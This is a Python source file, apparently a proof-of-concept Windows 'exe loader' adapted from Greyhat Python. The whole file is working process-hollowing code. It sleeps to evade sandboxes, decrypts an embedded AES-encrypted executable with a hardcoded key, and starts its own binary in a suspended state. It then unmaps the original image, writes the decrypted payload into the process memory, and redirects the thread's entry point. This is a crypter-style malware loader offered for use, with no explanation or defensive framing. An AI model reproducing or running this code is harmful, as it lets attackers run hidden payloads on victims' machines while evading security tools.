## Proof of concept exe loader
## Most of the code below was borrowed from Greyhat Python(http://www.nostarch.com/ghpython.htm)


import sys
import pefile
import struct
import base64
from ctypes import *
from win32api import LoadResource
from time import sleep
from Crypto.Cipher import AES

kernel32 = windll.kernel32
ntdll = windll.ntdll

# Microsoft types to ctypes 
BYTE      = c_ubyte
WORD      = c_ushort
DWORD     = c_ulong
LPBYTE    = POINTER(c_ubyte)
LPTSTR    = POINTER(c_char) 
HANDLE    = c_void_p
PVOID     = c_void_p
LPVOID    = c_void_p
UINT_PTR  = c_ulong
SIZE_T    = c_ulong

class STARTUPINFO(Structure):
    _fields_ = [
        ("cb",            DWORD),        
        ("lpReserved",    LPTSTR), 
        ("lpDesktop",     LPTSTR),  
        ("lpTitle",       LPTSTR),
        ("dwX",           DWORD),
        ("dwY",           DWORD),
        ("dwXSize",       DWORD),
        ("dwYSize",       DWORD),
        ("dwXCountChars", DWORD),
        ("dwYCountChars", DWORD),
        ("dwFillAttribute",DWORD),
        ("dwFlags",       DWORD),
        ("wShowWindow",   WORD),
        ("cbReserved2",   WORD),
        ("lpReserved2",   LPBYTE),
        ("hStdInput",     HANDLE),
        ("hStdOutput",    HANDLE),
        ("hStdError",     HANDLE),
        ]

		
class PROCESS_INFORMATION(Structure):
    _fields_ = [
        ("hProcess",    HANDLE),
        ("hThread",     HANDLE),
        ("dwProcessId", DWORD),
        ("dwThreadId",  DWORD),
        ]		
		
class FLOATING_SAVE_AREA(Structure):
   _fields_ = [
   
        ("ControlWord", DWORD),
        ("StatusWord", DWORD),
        ("TagWord", DWORD),
        ("ErrorOffset", DWORD),
        ("ErrorSelector", DWORD),
        ("DataOffset", DWORD),
        ("DataSelector", DWORD),
        ("RegisterArea", BYTE * 80),
        ("Cr0NpxState", DWORD),
]

class CONTEXT(Structure):
    _fields_ = [
    
        ("ContextFlags", DWORD),
        ("Dr0", DWORD),
        ("Dr1", DWORD),
        ("Dr2", DWORD),
        ("Dr3", DWORD),
        ("Dr6", DWORD),
        ("Dr7", DWORD),
        ("FloatSave", FLOATING_SAVE_AREA),
        ("SegGs", DWORD),
        ("SegFs", DWORD),
        ("SegEs", DWORD),
        ("SegDs", DWORD),
        ("Edi", DWORD),
        ("Esi", DWORD),
        ("Ebx", DWORD),
        ("Edx", DWORD),
        ("Ecx", DWORD),
        ("Eax", DWORD),
        ("Ebp", DWORD),
        ("Eip", DWORD),
        ("SegCs", DWORD),
        ("EFlags", DWORD),
        ("Esp", DWORD),
        ("SegSs", DWORD),
        ("ExtendedRegisters", BYTE * 512),
]


MAX_PATH_NULL = 1024
szFilePath = create_string_buffer(MAX_PATH_NULL)
kernel32.GetModuleFileNameA(0, szFilePath, MAX_PATH_NULL)

#try to beat sandbox by sleeping
sleep(5)
pFile = LoadResource(0, 'DATA', 1)

#crypto stuff
key = 'cafefeed5badf00d'
PADDING = '{'
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
decryptor = AES.new(key)
pFile = DecodeAES(decryptor, pFile)
	
pe = pefile.PE(data=pFile)
#print pe.dump_info()

startupinfo = STARTUPINFO()
process_information = PROCESS_INFORMATION()
CREATE_SUSPENDED = 0x00000004

kernel32.CreateProcessA(szFilePath,
None,
None,
None,
None,
CREATE_SUSPENDED,
None,
None,
byref(startupinfo),
byref(process_information))

# Context flag for GetThreadContext()
CONTEXT_FULL = 0x00010007
context = CONTEXT()
context.ContextFlags = CONTEXT_FULL
kernel32.GetThreadContext(process_information.hThread, byref(context))

dwImageBase = LPVOID()
kernel32.ReadProcessMemory(process_information.hProcess,
context.Ebx + 8,
byref(dwImageBase),
4,
None)

#print hex(dwImageBase.value)
#print hex(pe.OPTIONAL_HEADER.ImageBase)

if dwImageBase.value == pe.OPTIONAL_HEADER.ImageBase:
	ntdll.NtUnmapViewOfSection(process_information.hProcess,dwImageBase)

VIRTUAL_MEM = ( 0x1000 | 0x2000 )
PAGE_EXECUTE_READWRITE = 0x40

pImageBase = kernel32.VirtualAllocEx(process_information.hProcess, 
pe.OPTIONAL_HEADER.ImageBase, 
pe.OPTIONAL_HEADER.SizeOfImage,
VIRTUAL_MEM, 
PAGE_EXECUTE_READWRITE)



kernel32.WriteProcessMemory(process_information.hProcess,
pImageBase,
pFile,
pe.OPTIONAL_HEADER.SizeOfHeaders,
None
)


for section in pe.sections:
   kernel32.WriteProcessMemory(process_information.hProcess,
   pImageBase + section.VirtualAddress,
   pFile[(section.PointerToRawData):],   
   section.SizeOfRawData,
   None)

addr = struct.pack('<I',pImageBase)
#addr = "\x00\x00\x40\x00"
 
kernel32.WriteProcessMemory(process_information.hProcess,
context.Ebx + 8,
addr,
4,
None)

context.Eax = pImageBase + pe.OPTIONAL_HEADER.AddressOfEntryPoint
kernel32.SetThreadContext(process_information.hThread,byref(context))
kernel32.ResumeThread(process_information.hThread)

